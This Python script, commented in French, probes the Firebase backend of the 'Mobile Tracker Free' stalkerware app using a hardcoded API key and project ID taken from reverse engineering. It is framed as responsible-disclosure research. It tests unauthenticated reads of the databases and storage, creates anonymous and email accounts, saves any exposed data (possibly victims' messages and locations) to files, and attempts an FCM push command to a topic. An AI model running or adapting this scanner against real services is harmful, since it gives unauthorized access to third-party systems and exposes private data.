#!/usr/bin/env python3
"""
Mobile Tracker Free — Firebase Misconfig Scanner
Teste les misconfiguration Firebase du projet myappmobile-537f7
en utilisant les credentials extraits du reverse engineering.

⚠️  Usage exclusivement recherche / responsible disclosure.
    Ne PAS modifier les données si la DB est ouverte.

Référence : mtf_c2_analysis.md
"""

import json
import sys
import requests
from datetime import datetime

# ============================================================
# Credentials extraits de phone.monitor2026
# ============================================================

PROJECT_ID = "myappmobile-537f7"
API_KEY = "AIzaSyDbUBsZ11AUjeuOW9e8g1azhCV3wmDKhQ0"
APP_ID = "1:38496474107:android:1437f8b679b84fe53ab15e"
SENDER_ID = "38496474107"
STORAGE_BUCKET = "myappmobile-537f7.firebasestorage.app"
DB_URL = "https://myappmobile-537f7.firebaseio.com"

# Alternative DB URLs (Firebase peut utiliser différentes régions)
DB_URLS = [
    "https://myappmobile-537f7.firebaseio.com",
    "https://myappmobile-537f7-default-rtdb.firebaseio.com",
    "https://myappmobile-537f7-default-rtdb.europe-west1.firebasedatabase.app",
    "https://myappmobile-537f7-default-rtdb.asia-southeast1.firebasedatabase.app",
]

# Firestore REST API
FIRESTORE_URL = f"https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents"

# Storage REST API
STORAGE_URL = f"https://firebasestorage.googleapis.com/v0/b/{STORAGE_BUCKET}/o"

# Auth REST API (Identity Toolkit)
AUTH_URL = f"https://identitytoolkit.googleapis.com/v1/accounts"


def log(level: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {"OK": "✅", "FAIL": "❌", "WARN": "⚠️", "INFO": "ℹ️", "VULN": "🔓"}
    print(f"[{ts}] {icons.get(level, '•')} {msg}")


def save_result(tag: str, data):
    """Sauvegarde le résultat dans un fichier."""
    filename = f"firebase_scan_{tag}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    log("INFO", f"  Saved: {filename}")


# ============================================================
# Test 1 : Realtime Database — Read access
# ============================================================

def test_rtdb_read():
    """
    Teste si la Realtime Database est accessible en lecture sans auth.
    curl https://PROJECT_ID.firebaseio.com/.json
    Si ça retourne du JSON → DB ouverte en lecture.
    """
    log("INFO", "=== Test 1: Realtime Database — Read Access ===")

    for url in DB_URLS:
        test_url = f"{url}/.json"
        log("INFO", f"  Testing: {test_url}")
        try:
            resp = requests.get(test_url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data is not None:
                    # DB ouverte !
                    if isinstance(data, dict):
                        keys = list(data.keys())[:10]
                        log("VULN", f"  RTDB OPEN (READ) — {len(data)} top-level keys: {keys}")
                        save_result("rtdb_read", {"url": url, "keys": list(data.keys())[:50], "sample": str(data)[:2000]})
                    else:
                        log("VULN", f"  RTDB OPEN (READ) — Data type: {type(data).__name__}")
                else:
                    log("OK", f"  RTDB accessible but empty (null response)")
            elif resp.status_code == 401:
                log("FAIL", f"  401 Unauthorized — DB rules require auth (GOOD)")
            elif resp.status_code == 403:
                log("FAIL", f"  403 Forbidden — Read access denied (GOOD)")
            elif resp.status_code == 404:
                log("FAIL", f"  404 — DB not found at this URL")
            else:
                log("WARN", f"  HTTP {resp.status_code}: {resp.text[:200]}")
        except requests.exceptions.RequestException as e:
            log("FAIL", f"  Connection error: {e}")


# ============================================================
# Test 2 : Realtime Database — Shallow read (moins intrusif)
# ============================================================

def test_rtdb_shallow():
    """
    Lecture shallow — retourne seulement les clés de premier niveau.
    Moins intrusif que la lecture complète.
    """
    log("INFO", "=== Test 2: Realtime Database — Shallow Read ===")

    for url in DB_URLS[:2]:
        test_url = f"{url}/.json?shallow=true"
        log("INFO", f"  Testing: {test_url}")
        try:
            resp = requests.get(test_url, timeout=10)
            if resp.status_code == 200 and resp.json() is not None:
                data = resp.json()
                log("VULN", f"  RTDB SHALLOW — Keys: {list(data.keys())[:20] if isinstance(data, dict) else data}")
                save_result("rtdb_shallow", {"url": url, "data": data})
            elif resp.status_code in (401, 403):
                log("FAIL", f"  {resp.status_code} — Shallow read denied (GOOD)")
            else:
                log("WARN", f"  HTTP {resp.status_code}")
        except Exception as e:
            log("FAIL", f"  Error: {e}")


# ============================================================
# Test 3 : Firestore — Read access
# ============================================================

def test_firestore_read():
    """
    Teste si Firestore est accessible sans auth.
    """
    log("INFO", "=== Test 3: Firestore — Read Access ===")
    
    try:
        resp = requests.get(FIRESTORE_URL, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            docs = data.get("documents", [])
            log("VULN", f"  FIRESTORE OPEN (READ) — {len(docs)} documents")
            save_result("firestore_read", data)
        elif resp.status_code in (401, 403):
            log("FAIL", f"  {resp.status_code} — Firestore read denied (GOOD)")
        elif resp.status_code == 404:
            log("INFO", f"  404 — Firestore not configured for this project")
        else:
            log("WARN", f"  HTTP {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        log("FAIL", f"  Error: {e}")

    # Tester des collections courantes
    common_collections = ["users", "phones", "data", "messages", "locations", "logs", "devices"]
    for col in common_collections:
        try:
            resp = requests.get(f"{FIRESTORE_URL}/{col}", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                docs = data.get("documents", [])
                log("VULN", f"  Firestore /{col} — {len(docs)} documents accessible!")
                save_result(f"firestore_{col}", data)
            elif resp.status_code in (401, 403):
                pass  # Expected
        except Exception:
            pass


# ============================================================
# Test 4 : Storage Bucket — List files
# ============================================================

def test_storage_list():
    """
    Teste si le Storage Bucket est accessible en lecture.
    """
    log("INFO", "=== Test 4: Firebase Storage — List Files ===")

    try:
        resp = requests.get(STORAGE_URL, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            items = data.get("items", [])
            log("VULN", f"  STORAGE OPEN (LIST) — {len(items)} files")
            for item in items[:5]:
                name = item.get("name", "?")
                size = item.get("size", "?")
                log("VULN", f"    {name} ({size} bytes)")
            save_result("storage_list", data)
        elif resp.status_code in (401, 403):
            log("FAIL", f"  {resp.status_code} — Storage listing denied (GOOD)")
        else:
            log("WARN", f"  HTTP {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        log("FAIL", f"  Error: {e}")

    # Tester aussi le bucket legacy (.appspot.com)
    legacy_bucket = f"{PROJECT_ID}.appspot.com"
    legacy_url = f"https://firebasestorage.googleapis.com/v0/b/{legacy_bucket}/o"
    try:
        resp = requests.get(legacy_url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            items = data.get("items", [])
            log("VULN", f"  LEGACY STORAGE OPEN — {len(items)} files")
            save_result("storage_legacy", data)
        elif resp.status_code in (401, 403):
            log("FAIL", f"  Legacy bucket: access denied")
    except Exception:
        pass


# ============================================================
# Test 5 : Firebase Auth — Signup (créer un compte anonyme)
# ============================================================

def test_auth_signup():
    """
    Teste si on peut créer un compte Firebase Auth.
    Utilise l'endpoint signUp avec returnSecureToken.
    
    Note : ne crée PAS de vrai compte sur le service MTF,
    juste un token Firebase Auth (couche infra, pas applicatif).
    """
    log("INFO", "=== Test 5: Firebase Auth — Anonymous Signup ===")

    # Test signup anonyme
    try:
        resp = requests.post(
            f"{AUTH_URL}:signUp?key={API_KEY}",
            json={"returnSecureToken": True},
            timeout=10,
        )
        if resp.status_code == 200:
            data = resp.json()
            uid = data.get("localId", "?")
            token = data.get("idToken", "?")[:50]
            log("VULN", f"  AUTH SIGNUP OK — Anonymous UID: {uid}")
            log("INFO", f"  Token prefix: {token}...")
            save_result("auth_signup", {
                "uid": uid,
                "token_prefix": token,
                "refreshToken_prefix": data.get("refreshToken", "?")[:30],
                "expiresIn": data.get("expiresIn"),
            })
            return data  # Retourne le token pour les tests suivants
        elif resp.status_code == 400:
            error = resp.json().get("error", {})
            msg = error.get("message", "?")
            log("FAIL", f"  400 — {msg}")
            if "ADMIN_ONLY_OPERATION" in msg:
                log("OK", "  Anonymous signup disabled (GOOD)")
            elif "API_KEY_EXPIRED" in msg:
                log("WARN", "  API key expired or restricted")
        elif resp.status_code == 403:
            log("FAIL", f"  403 — Auth API restricted (GOOD)")
        else:
            log("WARN", f"  HTTP {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        log("FAIL", f"  Error: {e}")
    
    return None


# ============================================================
# Test 6 : Firebase Auth — Email signup
# ============================================================

def test_auth_email_signup():
    """
    Teste si on peut créer un compte email/password.
    Utilise une adresse jetable pour ne pas polluer.
    """
    log("INFO", "=== Test 6: Firebase Auth — Email Signup ===")
    
    test_email = f"test_mtf_research_{int(datetime.now().timestamp())}@example.com"
    
    try:
        resp = requests.post(
            f"{AUTH_URL}:signUp?key={API_KEY}",
            json={
                "email": test_email,
                "password": "ResearchTest123!",
                "returnSecureToken": True,
            },
            timeout=10,
        )
        if resp.status_code == 200:
            data = resp.json()
            uid = data.get("localId", "?")
            log("VULN", f"  EMAIL SIGNUP OK — UID: {uid} (email: {test_email})")
            save_result("auth_email", {"uid": uid, "email": test_email})
            return data
        elif resp.status_code == 400:
            msg = resp.json().get("error", {}).get("message", "?")
            log("FAIL", f"  400 — {msg}")
            if "EMAIL_EXISTS" in msg:
                log("WARN", "  Email already exists — signup works but test email taken")
            elif "OPERATION_NOT_ALLOWED" in msg:
                log("OK", "  Email signup disabled (GOOD)")
        else:
            log("WARN", f"  HTTP {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        log("FAIL", f"  Error: {e}")
    
    return None


# ============================================================
# Test 7 : Authenticated RTDB access (si signup réussi)
# ============================================================

def test_rtdb_authenticated(token: str):
    """
    Si on a obtenu un token auth, tester la RTDB avec auth.
    """
    log("INFO", "=== Test 7: RTDB with Auth Token ===")
    
    for url in DB_URLS[:2]:
        test_url = f"{url}/.json?auth={token}"
        try:
            resp = requests.get(test_url, timeout=10)
            if resp.status_code == 200 and resp.json() is not None:
                data = resp.json()
                if isinstance(data, dict):
                    log("VULN", f"  RTDB OPEN (AUTH READ) — {len(data)} keys: {list(data.keys())[:10]}")
                    save_result("rtdb_auth_read", {"url": url, "keys": list(data.keys())[:50]})
                else:
                    log("VULN", f"  RTDB OPEN (AUTH READ) — Data: {str(data)[:500]}")
            elif resp.status_code in (401, 403):
                log("FAIL", f"  {resp.status_code} — Auth read denied")
            else:
                log("WARN", f"  HTTP {resp.status_code}")
        except Exception as e:
            log("FAIL", f"  Error: {e}")


# ============================================================
# Test 8 : FCM Legacy API — Send message (needs server key)
# ============================================================

def test_fcm_legacy():
    """
    Teste si l'API key fonctionne comme server key FCM.
    Normalement non (client key ≠ server key), mais on vérifie.
    """
    log("INFO", "=== Test 8: FCM Legacy API (unlikely to work) ===")
    
    try:
        resp = requests.post(
            "https://fcm.googleapis.com/fcm/send",
            headers={
                "Authorization": f"key={API_KEY}",
                "Content-Type": "application/json",
            },
            json={
                "to": "/topics/test",
                "data": {"action": "settingsCheck"},
            },
            timeout=10,
        )
        if resp.status_code == 200:
            log("VULN", f"  FCM SEND OK — API key works as server key!")
            log("VULN", f"  → Can send commands to ALL stalkerware instances!")
            save_result("fcm_send", resp.json())
        elif resp.status_code == 401:
            log("FAIL", f"  401 — API key is NOT a server key (expected)")
        else:
            log("WARN", f"  HTTP {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        log("FAIL", f"  Error: {e}")


# ============================================================
# Test 9 : Remote Config
# ============================================================

def test_remote_config():
    """
    Teste si Firebase Remote Config est accessible.
    """
    log("INFO", "=== Test 9: Firebase Remote Config ===")
    
    try:
        resp = requests.post(
            f"https://firebaseremoteconfig.googleapis.com/v1/projects/{PROJECT_ID}/namespaces/firebase:fetch",
            headers={"Content-Type": "application/json"},
            json={
                "appId": APP_ID,
                "appInstanceId": "test_scan",
            },
            timeout=10,
        )
        if resp.status_code == 200:
            data = resp.json()
            entries = data.get("entries", {})
            if entries:
                log("VULN", f"  REMOTE CONFIG OPEN — {len(entries)} entries")
                for k in list(entries.keys())[:10]:
                    log("VULN", f"    {k} = {str(entries[k])[:100]}")
                save_result("remote_config", data)
            else:
                log("OK", f"  Remote Config accessible but empty")
        elif resp.status_code in (401, 403):
            log("FAIL", f"  {resp.status_code} — Remote Config restricted (GOOD)")
        else:
            log("WARN", f"  HTTP {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        log("FAIL", f"  Error: {e}")


# ============================================================
# Main
# ============================================================

def main():
    print("=" * 60)
    print("Mobile Tracker Free — Firebase Misconfig Scanner")
    print(f"Project: {PROJECT_ID}")
    print(f"API Key: {API_KEY[:20]}...")
    print(f"DB URL:  {DB_URL}")
    print(f"Storage: {STORAGE_BUCKET}")
    print("=" * 60)
    print()

    # Tests passifs (lecture seule)
    test_rtdb_read()
    print()
    test_rtdb_shallow()
    print()
    test_firestore_read()
    print()
    test_storage_list()
    print()
    test_remote_config()
    print()
    test_fcm_legacy()
    print()
    
    # Tests auth (crée potentiellement un compte)
    auth_data = test_auth_signup()
    print()
    
    if "--email" in sys.argv:
        email_data = test_auth_email_signup()
        print()
    
    # Tests authentifiés (si on a obtenu un token)
    if auth_data and auth_data.get("idToken"):
        test_rtdb_authenticated(auth_data["idToken"])
        print()

    print("=" * 60)
    print("Scan complete. Check firebase_scan_*.json for details.")
    print("=" * 60)


if __name__ == "__main__":
    main()
